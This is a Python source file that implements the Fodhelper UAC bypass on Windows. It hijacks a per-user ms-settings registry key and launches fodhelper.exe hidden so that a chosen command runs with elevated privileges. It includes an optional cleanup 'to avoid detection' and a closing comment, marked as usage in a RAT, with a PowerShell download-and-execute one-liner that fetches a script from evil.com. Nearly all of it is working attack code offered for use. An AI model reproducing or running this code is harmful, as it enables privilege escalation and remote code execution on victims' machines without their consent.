import subprocess
import winreg as reg
import os
import sys

class UACBypass:
    def __init__(self):
        self.key_path = r"Software\Classes\ms-settings\Shell\open\command"
        self.sub_key = "DelegateExecute"
        
    def get_self_path(self):
        """Gets the path of the current running executable"""
        if getattr(sys, 'frozen', False):
            # Running as PyInstaller exe
            return sys.executable
        else:
            # Running as Python script
            return sys.executable

    def bypass(self, command="cmd.exe /k echo UAC Bypassed!"):
        """
        Executes the Fodhelper UAC bypass.
        
        Args:
            command (str): The command to run with elevated privileges.
        """
        try:
            # 1. Open Registry Key
            key = reg.OpenKey(
                reg.HKEY_CURRENT_USER, 
                self.key_path, 
                0, 
                reg.KEY_WRITE
            )
            
            # 2. Set the command to execute
            reg.SetValueEx(key, "", 0, reg.REG_SZ, command)
            
            # 3. Set DelegateExecute to empty string (Critical for bypass)
            reg.SetValueEx(key, self.sub_key, 0, reg.REG_SZ, "")
            
            # Close key
            reg.CloseKey(key)
            
            # 4. Trigger fodhelper.exe
            # We use subprocess.Popen to run it silently
            subprocess.Popen(
                "C:\\Windows\\System32\\fodhelper.exe",
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            print("[+] Fodhelper UAC Bypass Triggered")
            
            # Optional: Clean up registry after a few seconds to avoid detection
            # threading.Timer(10, self.cleanup).start() 
            
            return True

        except Exception as e:
            print(f"[!] UAC Bypass Failed: {e}")
            return False

    def cleanup(self):
        """Removes the registry keys to restore normal behavior"""
        try:
            key = reg.OpenKey(
                reg.HKEY_CURRENT_USER, 
                self.key_path, 
                0, 
                reg.KEY_WRITE
            )
            reg.DeleteValue(key, "")
            reg.DeleteValue(key, self.sub_key)
            reg.CloseKey(key)
            print("[+] Registry Cleanup Complete")
        except Exception as e:
            print(f"[!] Cleanup Failed: {e}")

# Usage Example in RAT:
# bypasser = UACBypass()
# bypasser.bypass("powershell.exe -ep bypass -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/script.ps1\")'")